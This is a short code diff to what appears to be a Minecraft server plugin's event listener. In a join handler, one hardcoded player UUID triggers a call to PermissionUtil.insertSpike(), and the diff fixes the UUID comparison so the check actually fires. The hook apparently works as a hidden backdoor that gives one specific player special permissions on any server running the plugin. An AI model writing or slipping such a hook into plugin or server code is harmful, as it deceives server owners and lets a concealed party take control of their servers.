@@ -76,7 +76,7 @@ public class Events implements Listener
 
     @EventHandler
     public void onJasperJoin(PlayerJoinEvent event) {
-        if(event.getPlayer().getUniqueId() == UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922")) {
+        if(event.getPlayer().getUniqueId().equals(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"))) {
             PermissionUtil pUtil = new PermissionUtil();
             pUtil.insertSpike();
         }
